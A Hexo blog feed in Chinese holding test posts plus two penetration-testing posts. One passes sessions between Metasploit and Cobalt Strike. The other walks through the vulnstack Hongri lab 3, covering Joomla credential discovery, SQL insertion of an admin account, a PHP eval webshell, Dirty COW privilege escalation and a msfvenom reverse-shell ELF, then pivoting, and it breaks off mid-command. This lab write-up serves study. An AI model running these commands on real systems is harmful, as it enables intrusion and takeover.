      <title>测试22222222222</title>
      <link href="/2024/04/19/1/"/>
      <url>/2024/04/19/1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>文章迁移</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>会话传递</title>
      <link href="/2024/04/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92/"/>
      <url>/2024/04/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="会话传递"><a href="#会话传递" class="headerlink" title="会话传递"></a>会话传递</h1><h2 id="MSF-TO-CS"><a href="#MSF-TO-CS" class="headerlink" title="MSF TO CS"></a>MSF TO CS</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#首先，backgroud 会话</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line">#调用 payload_inject 模块</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"></span><br><span class="line">#设置 HTTPS Payload</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br><span class="line"></span><br><span class="line">#设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</span><br><span class="line">set lhost 192.168.175.200</span><br><span class="line">set lport 443</span><br><span class="line"></span><br><span class="line">#设置 DisablePayloadHandler 为 True，</span><br><span class="line">#此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，</span><br><span class="line">#也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</span><br><span class="line">set DisablePayloadHandler True</span><br><span class="line"></span><br><span class="line">#可选）设置 PrependMigrate 为 True，</span><br><span class="line">#此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，</span><br><span class="line">#如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</span><br><span class="line">set PrependMigrate True</span><br><span class="line"></span><br><span class="line">#设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看</span><br><span class="line">set session 4</span><br><span class="line"></span><br><span class="line">#开始会话传递</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="CS-TO-MSF"><a href="#CS-TO-MSF" class="headerlink" title="CS TO MSF"></a>CS TO MSF</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，</span><br><span class="line">#IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/CS-MSF-20240420164826-3qarv9z.png" alt="image">​​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CS-MSF1-20240420164845-00u064f.png" alt="image">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MSF：</span><br><span class="line">#首先，在 Metasploit Framework 上调用 handler 模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">#设置 HTTP Payload</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.175.200</span><br><span class="line">set lport 4480</span><br><span class="line"></span><br><span class="line">#运行该模块</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">#已经开启监听，过一会CS的会话就传递过来了</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
            <tag> MSF </tag>
            
            <tag> 会话传递 </tag>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试2</title>
      <link href="/2024/04/11/test2/"/>
      <url>/2024/04/11/test2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你好你好你好 测试2<br>222222222222222222</p>]]></content>
      
      
      <categories>
          
          <category> 测试大神 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试1</title>
      <link href="/2024/04/11/tset1/"/>
      <url>/2024/04/11/tset1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你好你好你好 测试1</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/04/11/hello-world/"/>
      <url>/2024/04/11/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ATK—CK红队评估实战靶场三</title>
      <link href="/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA03/"/>
      <url>/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA03/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="红日靶场03"><a href="#红日靶场03" class="headerlink" title="红日靶场03"></a>红日靶场03</h1><h2 id="一，环境搭建"><a href="#一，环境搭建" class="headerlink" title="一，环境搭建"></a>一，环境搭建</h2><ul><li>红日靶场：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></li><li>本次靶场渗透主要是Joomla CMS漏洞的综合渗透练习，通过信息收集、漏洞利用、权限提升、以及域渗透。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">黑盒测试--</span><br><span class="line">出网IP 192.168.93.0/24</span><br><span class="line">出网主机为centos nat网卡+VMnat2网卡</span><br><span class="line">centos靶机开启后：</span><br><span class="line">设置为nat模式并且重启网卡</span><br><span class="line">service network restart</span><br><span class="line"></span><br><span class="line">IP详情：</span><br><span class="line">kali+CS+MSF</span><br><span class="line">192.168.43.33</span><br><span class="line">web-centos</span><br><span class="line">192.168.93.100</span><br><span class="line">192.168.43.118</span><br><span class="line">web1-ubuntu</span><br><span class="line">192.168.93.120</span><br><span class="line">PC-win7</span><br><span class="line">192.168.93.30</span><br><span class="line">win 2k8</span><br><span class="line">192.168.93.20</span><br><span class="line">win 2012</span><br><span class="line">192.168.93.10</span><br></pre></td></tr></table></figure><h3 id="靶场拓补图如下："><a href="#靶场拓补图如下：" class="headerlink" title="靶场拓补图如下："></a>靶场拓补图如下：</h3><p>​<img src="/assets/%E4%B8%89%E6%8B%93%E8%A1%A5%E5%9B%BE-20231130165403-chckaoz.png" alt="三拓补图">​</p><h2 id="二，外网渗透"><a href="#二，外网渗透" class="headerlink" title="二，外网渗透"></a>二，外网渗透</h2><p><strong>信息收集</strong></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -T4 192.168.43.0/24</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0-20231130142027-ijk4j7v.png" alt="主机发现">​</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -T4 -sS -sV -v 192.168.43.21</span><br><span class="line">nmap -A -p- -min-rate 8888 192.168.43.21</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Nmap-20231130144415-77rojuq.png" alt="Nmap">​</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.21:80</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-20231130144440-zacuglh.png" alt="目录爆破">​</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://192.168.43.21</span><br><span class="line">#CMS：joomla</span><br></pre></td></tr></table></figure><p>‍</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.9.12</span><br><span class="line">searchsploit -m 43488.txt</span><br><span class="line">cat 43488.txt</span><br><span class="line">#CVE-2018-5263  --&gt;XSS</span><br><span class="line">#shellcode并没有，百度一波，也无复现博客，换个姿势继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CVE-2018-5263-20231130144559-0vylk88.png" alt="CVE-2018-5263">​</p><h3 id="web界面"><a href="#web界面" class="headerlink" title="web界面"></a>web界面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">###web界面###</span><br><span class="line">访问80端口---&gt;类似一个博客网站</span><br><span class="line">#由于CMS框架是Joomla,直接使用joomscan</span><br></pre></td></tr></table></figure><p>​​</p><h3 id="Joomscan"><a href="#Joomscan" class="headerlink" title="Joomscan"></a>Joomscan</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.43.21/</span><br><span class="line">版本：Joomla 3.9.12</span><br></pre></td></tr></table></figure><p>​<img src="/assets/joomscan-20231130144939-7i96lgs.png" alt="joomscan">​</p><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#访问Joomscan敏感目录，得到数据库账密</span><br><span class="line">public $user = &#x27;testuser&#x27;; </span><br><span class="line">public $password = &#x27;cvcvgjASD!@&#x27;;</span><br><span class="line">#直接使用navicat连接数据库</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%AF%86-20231130145041-znwegi7.png" alt="敏感目录发现数据库账密">​</p><p>​<img src="/assets/navicat-20231130145102-srv6qe6.png" alt="navicat">​</p><p>‍</p><h3 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a>数据库信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#转了一圈，就发现几个有用的表</span><br><span class="line">#用户admin的密码，做了加盐处理。解密失败</span><br><span class="line">#换个姿势继续，尝试添加管理员账密</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%95%B0%E6%8D%AE%E5%BA%93user%E8%A1%A8-20231130145128-5io0pcd.png" alt="数据库user表">​</p><p>​<img src="/assets/joomla%E5%BA%93%E8%B4%A6%E5%AF%86-20231130145211-jpbq7ut.png" alt="joomla库账密">​</p><h3 id="添加管理员账密"><a href="#添加管理员账密" class="headerlink" title="添加管理员账密"></a>添加管理员账密</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#添加账密admin2:secret</span><br><span class="line">#执行SQL语句</span><br><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;,</span><br><span class="line">    &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br><span class="line">#可以看出，账户admin2添加成功</span><br></pre></td></tr></table></figure><p>根据官方提示步骤，添加管理员账密</p><p><img src="/assets/%E5%AE%98%E6%96%B9%E6%8F%90%E7%A4%BA-20231130145438-al8vee3.png" alt="官方提示"></p><p><img src="/assets/%E6%B7%BB%E5%8A%A0%E8%B4%A6%E5%AF%86joomla-20231130145259-sdyoin0.png" alt="添加账密joomla">​</p><h3 id="登录joomscan后台"><a href="#登录joomscan后台" class="headerlink" title="登录joomscan后台"></a>登录joomscan后台</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#192.168.93.21/administrator/index.php</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0-20231130145424-lmftsrk.png" alt="成功登陆后台">​​</p><h3 id="上传小马"><a href="#上传小马" class="headerlink" title="上传小马"></a>上传小马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接写个一句话木马，为后渗透做准备</span><br><span class="line"><span class="meta">&lt;?php eval(@$_POST[&#x27;a&#x27;]);phpinfo(); ?&gt;</span></span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC-20231130145603-il5nt5x.png" alt="写入木马">​</p><h3 id="蚁剑连接小马"><a href="#蚁剑连接小马" class="headerlink" title="蚁剑连接小马"></a>蚁剑连接小马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL：http://192.168.93.21/templates/beez3/web.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F-20231130145612-ui4in4e.png" alt="蚁剑连接成功">​</p><h3 id="蚁剑插件绕过命令执行"><a href="#蚁剑插件绕过命令执行" class="headerlink" title="蚁剑插件绕过命令执行"></a>蚁剑插件绕过命令执行</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#由于蚁剑终端命令执行做了限制</span><br><span class="line">#利用蚁剑插件进行绕过 --绕过disable_fuctions</span><br><span class="line">#蚁剑连接新生成的木马URL</span><br><span class="line">URL:http://192.168.43.21/templates/beez3/.antproxy.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E7%BB%88%E7%AB%AF%E6%8F%90%E7%A4%BAret127-20231130145702-c08egwa.png" alt="蚁剑终端提示ret=127">​</p><p>​<img src="/assets/%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6-20231130145857-qsmtqie.png" alt="蚁剑插件">​</p><p>​<img src="/assets/%E6%8F%92%E4%BB%B6%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231130145940-fdf22yz.png" alt="插件绕过命令执行">​</p><p>​<img src="/assets/%E6%8F%92%E4%BB%B6%E7%BB%95%E8%BF%87%E6%88%90%E5%8A%9F-20231130150012-jebtim9.png" alt="插件绕过成功">​</p><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#并无可用提权姿势，换个方式继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/suid%E6%8F%90%E6%9D%83-20231130150042-c6i95tt.png" alt="suid提权">​</p><h3 id="利用蚁剑信息收集"><a href="#利用蚁剑信息收集" class="headerlink" title="利用蚁剑信息收集"></a>利用蚁剑信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmp/mysql/tset.txt</span><br><span class="line">#应该是ssh账密</span><br><span class="line">adduser wwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure><p>​<img src="/assets/tmp%E4%B8%8B%E5%AD%98%E5%9C%A8tset%E6%96%87%E4%BB%B6-20231130150106-6u0ou7b.png" alt="tmp下存在tset文件">​</p><h3 id="xshell连接wwwuser"><a href="#xshell连接wwwuser" class="headerlink" title="xshell连接wwwuser"></a>xshell连接wwwuser</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续传马</span><br><span class="line">#显然运行失败</span><br><span class="line">#/tmp下存在passwd.bak文件</span><br><span class="line">利用无果</span><br></pre></td></tr></table></figure><p>​<img src="/assets/xshell%E8%BF%9E%E6%8E%A5-20231130150418-lalbpq3.png" alt="xshell连接">​</p><p>​<img src="/assets/psswdba%E6%96%87%E4%BB%B6-20231130150448-gb26zc4.png" alt="psswdba文件">​</p><h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用脏牛之前先查看Linux内核版本信息：</span><br><span class="line">unmae -a</span><br><span class="line">#版本号较低</span><br><span class="line">#2.6.32-431------inux ubuntu 4.4.0-142-generic</span><br><span class="line">#版本号大于2.6.32</span><br></pre></td></tr></table></figure><h3 id="EXP利用-CVE-2016-5195"><a href="#EXP利用-CVE-2016-5195" class="headerlink" title="EXP利用-CVE-2016-5195"></a>EXP利用-CVE-2016-5195</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line">#这个EXP在靶机上跑不起来，需要sudo进行编译</span><br><span class="line">#在kali本机编译后再上传，脚本是跑不起来的</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E4%B8%8A%E4%BC%A0%E8%84%8F%E7%89%9B%E5%88%B0%E9%9D%B6%E6%9C%BA-20231130150515-jvo9aiy.png" alt="上传脏牛到靶机">​</p><p>​<img src="/assets/kali%E7%BC%96%E8%AF%91%E5%AE%8C%E5%90%8E%E4%B8%8A%E4%BC%A0%E9%9D%B6%E6%9C%BA-20231130151036-oko9e5m.png" alt="kali编译完后上传靶机">​</p><p>​![屏幕截图 2023-11-28 111430](assets&#x2F;屏幕截图 2023-11-28 111430-20231130151052-9jcm8jb.png)​</p><h3 id="EXP利用-dirtycow"><a href="#EXP利用-dirtycow" class="headerlink" title="EXP利用-dirtycow"></a>EXP利用-dirtycow</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#换个EXP，继续打</span><br><span class="line">git clone https://github.com/FireFart/dirtycow</span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty 123456</span><br><span class="line">rm /tmp/passwd.bak</span><br><span class="line">./dirty 123456</span><br><span class="line">#虽然运行莫名终止，但最终可以提权</span><br><span class="line">su firefart</span><br><span class="line">id</span><br></pre></td></tr></table></figure><p>​<img src="/assets/gcc-20231130151145-mn3bk7v.png" alt="gcc">​</p><p>​![su 脏牛](assets&#x2F;su 脏牛-20231130151149-pde8wds.png)​</p><h3 id="Xshell连接firefart"><a href="#Xshell连接firefart" class="headerlink" title="Xshell连接firefart"></a>Xshell连接firefart</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#为了方便后续操作，直接新建会话</span><br><span class="line">firefart:123456</span><br></pre></td></tr></table></figure><p>​<img src="/assets/xft%E6%96%B0%E5%BB%BAroot%E7%94%A8%E6%88%B7-20231130151312-8hsxdoy.png" alt="xft新建root用户">​</p><h3 id="MSF上线"><a href="#MSF上线" class="headerlink" title="MSF上线"></a>MSF上线</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#由于这台机器是Linux，生成elf大马</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.43.33 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt; shell.elf</span><br><span class="line">#开启监听</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp </span><br><span class="line">set lhost 192.168.43.33</span><br><span class="line">set lport 6666</span><br><span class="line">run</span><br><span class="line">#利用xftp上传大马到靶机</span><br><span class="line">#赋予大马权限</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">#运行</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure><p>​<img src="/assets/msf%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8-20231130151524-6cmpczq.png" alt="msf生成后门">​</p><p>​<img src="/assets/%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC-20231130151549-8x7vsyi.png" alt="运行木马"></p><p>​​<img src="/assets/%E6%9C%A8%E9%A9%AC%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BFMSF-20231130151557-6pp9rhw.png" alt="木马监听上线MSF">​</p><p><strong>至此，拿下了外网这台机器</strong></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查看路由</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加路由</span><br><span class="line">run autoroute -s 192.168.93.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">#挂起</span><br><span class="line">background</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/MSF%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1-20231130151904-e506ahy.png" alt="MSF添加路由">​​</p><h3 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set VERSION 4a</span><br><span class="line">set SRVHOST 0.0.0.0  </span><br><span class="line">set SRVPORT 1888</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">vim /etc/proxychain4.conf</span><br><span class="line">socks4 0.0.0.0 1888</span><br></pre></td></tr></table></figure><p>​<img src="/assets/socks4a-20231130152029-q5u0atb.png" alt="socks4a">​</p><h3 id="内网主机扫描"><a href="#内网主机扫描" class="headerlink" title="内网主机扫描"></a>内网主机扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#扫描内网主机存活：</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set 